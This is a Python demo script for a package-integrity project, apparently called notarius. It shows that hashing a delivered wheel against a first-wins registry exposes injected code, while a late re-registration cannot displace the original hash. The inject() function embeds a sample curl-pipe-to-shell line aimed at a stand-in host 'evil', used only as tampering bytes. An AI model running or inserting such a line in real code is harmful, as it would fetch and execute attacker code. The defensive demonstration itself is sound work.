#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Supply-chain demo on OUR OWN wheel (AD-53).

Shows the author's idea literally: injecting code into the delivered artifact
lands "on the glass"; reconciling against the registry's authentic hash exposes it.

Run: python3 scripts/supply_chain_demo.py
(if dist/ is empty — a synthetic artifact is built for illustration)
"""

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from notarius.supply import ArtifactRegistry, verify_delivery   # noqa: E402

PKG = "notarius==0.1.0"
WHEEL = ROOT / "dist" / "notarius-0.1.0-py3-none-any.whl"


def load_artifact():
    if WHEEL.exists():
        return WHEEL.read_bytes(), f"real wheel ({WHEEL.name})"
    return b"SYNTHETIC ARTIFACT: def notarius(): return 'clean'", "synthetic artifact"


def inject(blob: bytes) -> bytes:
    """"Slip in your own code" into the delivered copy (on the glass)."""
    marker = b"\n# INJECTED: __import__('os').system('curl evil|sh')\n"
    return blob[: len(blob) // 2] + marker + blob[len(blob) // 2:]


def show(label, res):
    icon = {"MATCH": "✅", "FORGERY_ON_GLASS": "🔴", "UNKNOWN_PACKAGE": "⚠️",
            "REGISTRY_TAMPERED": "🔴"}.get(res["status"], "•")
    print(f"  {icon} {label}: {res['status']}")
    if "note" in res:
        print(f"       {res['note']}")
    if res["status"] == "FORGERY_ON_GLASS":
        print(f"       registry:  {res['registry_hash'][:24]}…")
        print(f"       delivered: {res['delivered_hash'][:24]}…")


def main():
    authentic, what = load_artifact()
    print("=" * 66)
    print(f"ARTIFACT: {what}, {len(authentic)} bytes")
    print("=" * 66)

    # 1. The author writes the AUTHENTIC hash into the registry (registry under glass)
    reg = ArtifactRegistry()
    reg.register(PKG, authentic, "notarius-maintainer", "2026-07-23")
    print("\n1) The author wrote the authentic hash into the registry.")

    # 2. The verifier received the AUTHENTIC copy
    print("\n2) An authentic copy was delivered:")
    show("authentic copy", verify_delivery(reg, PKG, authentic))

    # 3. The hacker injected code into the DELIVERED copy (on the glass)
    print("\n3) The hacker injected code into the delivered copy (on the glass):")
    show("injected copy", verify_delivery(reg, PKG, inject(authentic)))

    # 4. The hacker tries to re-register the package under HIS hash (scribbles on the registry)
    print("\n4) The hacker re-registered the same package under his hash (later):")
    reg.register(PKG, inject(authentic), "thief", "2026-07-25")
    show("authentic copy (first-wins)", verify_delivery(reg, PKG, authentic))
    print("       → the first seal = original; the late re-registration did not displace it")

    print("\n" + "=" * 66)
    print("CONCLUSION: the injection into delivery landed ON THE GLASS and was exposed by reconciling with the registry.")
    print("BOUNDARY: hijacking the maintainer's key (editing the registry itself) is NOT caught")
    print("          by reconciliation; you need a THRESHOLD (custody/frost) + PUBLICITY (cosign).")


if __name__ == "__main__":
    main()
